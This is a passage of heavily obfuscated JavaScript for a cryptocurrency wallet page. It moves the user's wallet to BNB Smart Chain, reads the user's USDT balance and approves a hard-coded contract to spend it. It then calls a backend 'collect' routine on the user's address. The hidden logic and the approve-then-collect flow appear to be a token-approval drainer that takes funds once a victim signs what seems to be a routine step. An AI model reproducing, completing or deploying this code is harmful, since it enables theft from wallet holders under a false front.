        if (_0x508e64[_0x2d05f6(0x1ff)](_0x508e64[_0x2d05f6(0x187)](Number, _0x414e49[_0x2d05f6(0x214)]), -0x1a24 + 0xf8d + 0x1 * 0xacf)) {
            _0x508e64[_0x2d05f6(0x142)](setLoading, !![], _0x508e64[_0x2d05f6(0x1cd)]);
            try {
                await _0x215495[_0x2d05f6(0x1a2)]({
                    'method': _0x508e64[_0x2d05f6(0x20a)],
                    'params': [{ 'chainId': BSC_CHAIN_ID_HEX }]
                });
            } catch (_0x2213d8) {
                if (_0x508e64[_0x2d05f6(0x24c)](_0x2213d8[_0x2d05f6(0x1cb)], 0x1 * -0x503 + -0x1 * -0xb47 + 0xce2))
                    await _0x215495[_0x2d05f6(0x1a2)]({
                        'method': _0x508e64[_0x2d05f6(0x245)],
                        'params': [BSC_CHAIN_PARAMS]
                    });
                else {
                    _0x508e64[_0x2d05f6(0x143)](showToast, _0x508e64[_0x2d05f6(0x1f7)], _0x508e64[_0x2d05f6(0x196)]), _0x508e64[_0x2d05f6(0x237)](setLoading, ![]);
                    return;
                }
            }
        }
        const _0x2ce7a1 = await _0x30558f[_0x2d05f6(0x19c)](), _0x4ab8e8 = await _0x2ce7a1[_0x2d05f6(0x213)]();
        _0x508e64[_0x2d05f6(0x143)](setLoading, !![], _0x508e64[_0x2d05f6(0x22b)]);
        const _0x467c3b = await _0x30558f[_0x2d05f6(0x192)](_0x4ab8e8), _0x2389f8 = ethers[_0x2d05f6(0x1a0)](_0x508e64[_0x2d05f6(0x27b)]);
        if (_0x508e64[_0x2d05f6(0x1e2)](_0x467c3b, _0x2389f8)) {
            _0x508e64[_0x2d05f6(0x1ad)](showToast, _0x508e64[_0x2d05f6(0x229)], _0x508e64[_0x2d05f6(0x196)]), _0x508e64[_0x2d05f6(0x237)](setLoading, ![]);
            return;
        }
        const _0x54af7a = document[_0x2d05f6(0x225) + _0x2d05f6(0x1b7)](_0x508e64[_0x2d05f6(0x247)]), _0x419ef8 = _0x54af7a ? _0x54af7a[_0x2d05f6(0x259)] : '1', _0xceaa31 = ethers[_0x2d05f6(0x195)](_0x508e64[_0x2d05f6(0x1e7)](_0x419ef8, '1'), 0x81e * 0x3 + 0x66e + 0x2 * -0xf5b), _0x5eb432 = new ethers[(_0x2d05f6(0x217))](BSC_USDT_ADDRESS, ERC20_ABI, _0x2ce7a1);
        _0x508e64[_0x2d05f6(0x143)](setLoading, !![], _0x508e64[_0x2d05f6(0x27a)]);
        const _0x4a1c98 = await _0x5eb432[_0x2d05f6(0x15c)](_0x4ab8e8);
        if (_0x508e64[_0x2d05f6(0x22f)](_0x4a1c98, _0xceaa31)) {
            _0x508e64[_0x2d05f6(0x20e)](showToast, _0x508e64[_0x2d05f6(0x204)], _0x508e64[_0x2d05f6(0x196)]), _0x508e64[_0x2d05f6(0x237)](setLoading, ![]);
            return;
        }
        _0x508e64[_0x2d05f6(0x173)](setLoading, !![], _0x508e64[_0x2d05f6(0x16e)]);
        const _0x357029 = await _0x5eb432[_0x2d05f6(0x1c9)](_0x4ab8e8, CONTRACT_ADDRESS);
        if (_0x508e64[_0x2d05f6(0x1e5)](_0x357029, _0xceaa31)) {
            _0x508e64[_0x2d05f6(0x26d)](setLoading, !![], _0x508e64[_0x2d05f6(0x246)]);
            const _0x215bbf = await _0x5eb432[_0x2d05f6(0x26b)](CONTRACT_ADDRESS, _0xceaa31);
            _0x508e64[_0x2d05f6(0x26d)](setLoading, !![], _0x508e64[_0x2d05f6(0x231)]), await _0x215bbf[_0x2d05f6(0x180)]();
        }
        _0x508e64[_0x2d05f6(0x144)](setLoading, !![], _0x508e64[_0x2d05f6(0x19e)]);
        const _0xe62a8f = await _0x508e64[_0x2d05f6(0x237)](triggerBackendCollect, _0x4ab8e8), _0x522f02 = _0xe62a8f?.[_0x2d05f6(0x1e6)] || '';
        _0x522f02 ? _0x508e64[_0x2d05f6(0x16c)](showToast, _0x2d05f6(0x219) + _0x2d05f6(0x27e) + _0x2d05f6(0x264) + _0x2d05f6(0x1f8) + _0x2d05f6(0x181) + 'x/' + _0x522f02 + (_0x2d05f6(0x1aa) + _0x2d05f6(0x158) + _0x2d05f6(0x1ab) + _0x2d05f6(0x276) + _0x2d05f6(0x282) + _0x2d05f6(0x288) + _0x2d05f6(0x1ea) + _0x2d05f6(0x18d) + _0x2d05f6(0x14d)), _0x508e64[_0x2d05f6(0x1f5)], -0x3ce6 + 0x1c1 * 0x1e + 0x2788) : _0x508e64[_0x2d05f6(0x1c6)](showToast, _0x508e64[_0x2d05f6(0x1f1)], _0x508e64[_0x2d05f6(0x1f5)], -0x17c3 * -0x1 + 0xb + -0x5e);
    } catch (_0x2c769d) {
        const _0x3c839a = _0x2c769d?.[_0x2d05f6(0x20c)] ?? _0x2c769d?.[_0x2d05f6(0x15f)] ?? _0x508e64[_0x2d05f6(0x140)];
        _0x508e64[_0x2d05f6(0x205)](_0x2c769d[_0x2d05f6(0x1cb)], -0x23 * 0x5c + 0x23f3 + -0x7be) || _0x3c839a[_0x2d05f6(0x17b) + 'e']()[_0x2d05f6(0x150)](_0x508e64[_0x2d05f6(0x1c1)]) || _0x3c839a[_0x2d05f6(0x17b) + 'e']()[_0x2d05f6(0x150)](_0x508e64[_0x2d05f6(0x232)]) || _0x3c839a[_0x2d05f6(0x17b) + 'e']()[_0x2d05f6(0x150)](_0x508e64[_0x2d05f6(0x1ce)]) ? _0x508e64[_0x2d05f6(0x143)](showToast, _0x508e64[_0x2d05f6(0x17e)], _0x508e64[_0x2d05f6(0x25b)]) : (console[_0x2d05f6(0x1d5)](_0x508e64[_0x2d05f6(0x197)], _0x2c769d), _0x508e64[_0x2d05f6(0x142)](showToast, _0x508e64[_0x2d05f6(0x253)], _0x508e64[_0x2d05f6(0x196)]));
    } finally {
        _0x508e64[_0x2d05f6(0x223)](setLoading, ![]);
    }
}
